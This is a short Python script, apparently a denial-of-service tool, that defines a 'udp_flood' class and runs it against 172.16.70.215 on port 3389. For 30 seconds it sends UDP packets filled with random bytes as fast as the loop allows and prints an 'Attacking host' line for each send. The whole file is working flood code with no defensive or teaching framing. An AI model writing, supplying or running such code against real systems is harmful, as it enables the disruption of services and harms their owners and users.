import socket
import time
import random


class udp_flood:
    def __init__(self, *, target, port):
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
        self.target = target
        self.port = port 

    def attack(self, *, timeout=30):
        beg_time = int(time.time())
        end_time = beg_time + timeout
        count = 0
        while time.time() < end_time:
            size = random.randint(100, 999)
            bytes = random._urandom(size)
            self.udp.sendto(bytes, (self.target, self.port))
            count += 1
            s = "Attacking host %s port %s send package %s"%(self.target, self.port, count)
            print(s)



x = udp_flood(target="172.16.70.215", port=3389)
x.attack()
